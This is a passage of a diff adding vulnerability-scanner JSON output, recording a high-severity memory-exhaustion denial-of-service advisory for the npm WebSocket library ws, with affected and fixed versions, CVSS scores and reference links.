+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:180b174a1f455e0b1b9d6ac3eb31b2318737ee4af461159c1ea50c8281e4b50c",
+          "Title": "ws: ws: Denial of Service via memory exhaustion from small WebSocket fragments",
+          "Description": "ws is an open source WebSocket client and server for Node.js. All versions from 1.1.0 up to (but not including) 5.2.5, from 6.0.0 up to 6.2.4, from 7.0.0 up to 7.5.11, and from 8.0.0 up to 8.21.0 are affected by a memory exhaustion DoS vulnerability. A peer can send a high volume of exceptionally small fragments and data chunks, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM. This issue has been fixed in versions 5.2.5, 6.2.4, 7.5.11, and 8.21.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-770",
+            "CWE-1050"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:26638",
+            "https://access.redhat.com/errata/RHSA-2026:27171",
+            "https://access.redhat.com/errata/RHSA-2026:29197",
+            "https://access.redhat.com/errata/RHSA-2026:33155",
+            "https://access.redhat.com/errata/RHSA-2026:33160",
+            "https://access.redhat.com/errata/RHSA-2026:33163",
+            "https://access.redhat.com/errata/RHSA-2026:33173",
+            "https://access.redhat.com/errata/RHSA-2026:33183",
+            "https://access.redhat.com/errata/RHSA-2026:33574",
+            "https://access.redhat.com/errata/RHSA-2026:34342",
+            "https://access.redhat.com/errata/RHSA-2026:36754",
+            "https://access.redhat.com/errata/RHSA-2026:36820",
+            "https://access.redhat.com/errata/RHSA-2026:37272",
+            "https://access.redhat.com/errata/RHSA-2026:40984",
+            "https://access.redhat.com/errata/RHSA-2026:41928",
+            "https://access.redhat.com/errata/RHSA-2026:41941",
+            "https://access.redhat.com/errata/RHSA-2026:41944",
+            "https://access.redhat.com/errata/RHSA-2026:48151",
+            "https://access.redhat.com/security/cve/CVE-2026-48779",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2489661",
+            "https://github.com/websockets/ws",
+            "https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7",
+            "https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53",
+            "https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94",
+            "https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8",
+            "https://github.com/websockets/ws/security/advisories/GHSA-96hv-2xvq-fx4p",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-48779",
+            "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48779.json",
+            "https://www.cve.org/CVERecord?id=CVE-2026-48779"
+          ],
+          "PublishedDate": "2026-06-17T13:20:42.887Z",
+          "LastModifiedDate": "2026-07-30T12:18:56.563Z"
+        }
+      ]
+    }
+  ]
+}
